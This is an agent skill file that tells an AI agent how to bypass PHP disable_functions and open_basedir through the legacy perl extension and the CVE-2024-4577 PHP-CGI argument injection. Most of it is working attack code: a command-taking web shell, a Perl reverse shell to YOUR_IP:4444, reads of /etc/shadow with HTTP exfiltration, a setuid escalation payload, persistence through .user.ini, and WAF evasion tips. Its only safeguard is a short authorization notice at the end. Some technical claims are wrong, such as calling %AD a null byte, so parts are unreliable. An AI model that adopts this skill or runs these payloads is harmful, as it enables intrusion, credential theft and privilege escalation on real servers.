---
name: php-perl-extension-bypass
description: Bypass PHP disable_functions, open_basedir, and safe_mode restrictions using the legacy perl PHP extension (CVE-2007-4596) or PHP-CGI argument injection (CVE-2024-4577). Use this skill whenever you need to execute commands, read arbitrary files, or escalate privileges on a PHP server where standard PHP functions are blocked. Trigger this when you encounter PHP restrictions during web application pentesting, need to bypass WAF rules targeting PHP functions, or want to enumerate what's possible on a compromised PHP endpoint.
---

# PHP Perl Extension Bypass

A skill for exploiting the legacy `perl` PHP extension to bypass PHP security restrictions during authorized security assessments.

## When to Use This Skill

Use this skill when:
- You've gained code execution on a PHP server but `disable_functions` blocks `system()`, `exec()`, `shell_exec()`, etc.
- `open_basedir` is restricting file access and you need to read files outside the webroot
- You're testing legacy PHP 5/7 environments with `safe_mode` enabled
- You need to establish reverse shells or exfiltrate data when PHP's network functions are blocked
- You're on a Windows PHP-CGI server vulnerable to CVE-2024-4577

## Prerequisites

Before attempting these techniques:
1. **Confirm you have authorization** to test the target system
2. Verify the `perl` extension is loaded: `var_dump(extension_loaded('perl'));`
3. Check PHP version: `phpinfo()` or `echo PHP_VERSION;`
4. Identify if you're on PHP-CGI (Windows) or Apache mod_php (Linux)

## Technique 1: Basic Command Execution

When the `perl` extension is loaded, you can execute arbitrary commands:

```php
<?php
if (!extension_loaded('perl')) {
    die('perl extension not loaded');
}

$perl = new perl();
$cmd = $_GET['cmd'] ?? 'id';
$perl->eval("system('" . $cmd . "')");
?>
```

**Usage:**
```
http://target/vuln.php?cmd=id
http://target/vuln.php?cmd=cat%20/etc/passwd
http://target/vuln.php?cmd=whoami
```

## Technique 2: Reverse Shell via IO::Socket

Establish a reverse shell even when PHP's socket functions are disabled:

```php
<?php
$perl = new perl();
$attacker_ip = 'YOUR_IP';
$attacker_port = 4444;

$payload = "use IO::Socket::INET;\n" .
    "my \$c = IO::Socket::INET->new(PeerHost=>'$attacker_ip',PeerPort=>$attacker_port,Proto=>'tcp');\n" .
    "open STDIN, '<&', \$c;\n" .
    "open STDOUT, '>&', \$c;\n" .
    "open STDERR, '>&', \$c;\n" .
    "exec('/bin/sh -i');";

$perl->eval($payload);
?>
```

**Listener setup:**
```bash
nc -lvnp 4444
```

## Technique 3: File Read Bypass (open_basedir)

Read arbitrary files regardless of `open_basedir` restrictions:

```php
<?php
$perl = new perl();
$file = '/etc/shadow';

$perl->eval("open(F, '$file') || die \$!; print while <F>; close F;");
?>
```

**For exfiltration via HTTP:**
```php
<?php
$perl = new perl();
$file = '/etc/shadow';

$payload = "use Net::HTTP;\n" .
    "my \$req = Net::HTTP->new(GET, 'http://YOUR_IP:8080/collect');\n" .
    "open(F, '$file') or die \$!;\n" .
    "my \$content = join('', <F>);\n" .
    "\$req->content(\$content);\n" .
    "my \$res = Net::HTTP->send(\$req);";

$perl->eval($payload);
?>
```

## Technique 4: Inline C Compilation (Privilege Escalation)

If `Inline::C` is available, compile native code for privilege escalation:

```php
<?php
$perl = new perl();

$payload = <<<'PL'
use Inline C => 'DATA';
print escalate();
__DATA__
__C__
char* escalate(){
    setuid(0);
    system("/bin/bash -c 'id; cat /root/flag'");
    return "";
}
PL
;

$perl->eval($payload);
?>
```

## Technique 5: Database Enumeration

Enumerate MySQL connections even without PHP's mysqli extension:

```php
<?php
$perl = new perl();
$perl->eval('use DBI; @dbs = DBI->data_sources("mysql"); print join("\n", @dbs);');
?>
```

## Technique 6: CVE-2024-4577 PHP-CGI Argument Injection

On vulnerable Windows PHP-CGI servers (PHP < 8.1.29/8.2.20/8.3.8), inject extension loading via URL:

**Step 1: Upload perl.dll to web-writable path**
```bash
# Upload perl.dll to C:\xampp\htdocs\temp\perl.dll
```

**Step 2: Inject extension loading via URL**
```http
POST /?%ADd+extension=C:\\xampp\\htdocs\\temp\\perl.dll+%ADd+auto_prepend_file%3dphp://input HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded
Content-Length: 120

<?php $p=new perl(); $p->eval("system('whoami && hostname')"); ?>
```

**Note:** The `%AD` is a null byte that bypasses argument parsing. This loads the extension before processing the request body.

## Building perl.so on Target (If phpize Available)

If you have `phpize` and build tools on the compromised host:

```bash
wget https://pecl.php.net/get/perl-1.0.1.tgz
tar xvf perl-1.0.1.tgz && cd perl-1.0.1
phpize
./configure --with-perl=/usr/bin/perl --with-php-config=$(php -r 'echo PHP_BINARY;')-config
make -j$(nproc)
cp modules/perl.so /tmp/perl.so
echo "extension=/tmp/perl.so" > /var/www/html/.user.ini
```

## Detection & Evasion

**Signs the extension is loaded:**
- `extension_loaded('perl')` returns true
- `get_loaded_extensions()` includes 'perl'
- `new perl()` doesn't throw an error

**Evasion tips:**
- Encode payloads to avoid WAF detection
- Use `eval()` with string concatenation to avoid static analysis
- Split payloads across multiple requests if needed
- Use base64 encoding for complex payloads

## Limitations

- **PHP 8+**: The perl extension generally doesn't compile due to Zend API changes
- **PECL vs PIE**: Modern PHP uses PIE instead of PECL; older stacks still use PECL
- **Windows**: Requires perl.dll; Linux requires perl.so
- **Inline::C**: May not be installed on all systems

## References

- [CVE-2007-4596](https://www.cvedetails.com/cve/CVE-2007-4596/)
- [PECL perl extension](https://pecl.php.net/package/perl)
- [CVE-2024-4577 PHP-CGI injection](https://github.com/AlperenY-cs/CVE-2024-4577)
- [Original PoC by NetJackal](http://blog.safebuff.com/2016/05/06/disable-functions-bypass/)

## Safety Notice

This skill is for authorized security testing only. Always obtain written permission before testing any system. Unauthorized access to computer systems is illegal.
